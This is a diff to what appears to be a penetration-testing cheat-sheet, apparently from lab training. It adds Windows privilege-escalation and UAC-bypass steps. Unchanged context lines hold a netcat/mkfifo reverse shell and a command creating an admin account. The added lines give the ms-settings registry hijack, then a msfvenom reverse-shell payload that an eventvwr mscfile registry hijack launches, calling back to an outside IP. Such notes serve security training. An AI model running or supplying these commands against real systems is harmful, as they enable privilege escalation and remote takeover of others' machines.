@@ -73,7 +73,8 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp
 
 
 ```
-whoami /groups
+whoami /priv
+whoami /groups - check privilege level for uac
 
 net user admin Ev!lpass
 powershell.exe Start-Process cmd.exe -Verb runAs - will require accepting UAC prompt
@@ -99,6 +100,26 @@ HKCR:ms-settings\shell\open\command
 REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
 REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
 REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
+
+
+UAC Bypass
+
+```
+whoami /priv
+
+whoami /groups
+
+
+C:\users\alice\desktop\sigcheck64.exe -accepteula -a -m .\eventvwr.exe
+
+Did this to get high integrity shell and bypass
+
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.119.175 LPORT=443 -f exe > shell_443.exe
+
+reg add HKCU\Software\Classes\mscfile\shell\open\command /d C:\users\alice\desktop\shell_443.exe /f
+
+C:\Windows\system32\eventvwr.exe
+```
 
 
 Listing running services on Windows using PowerShell
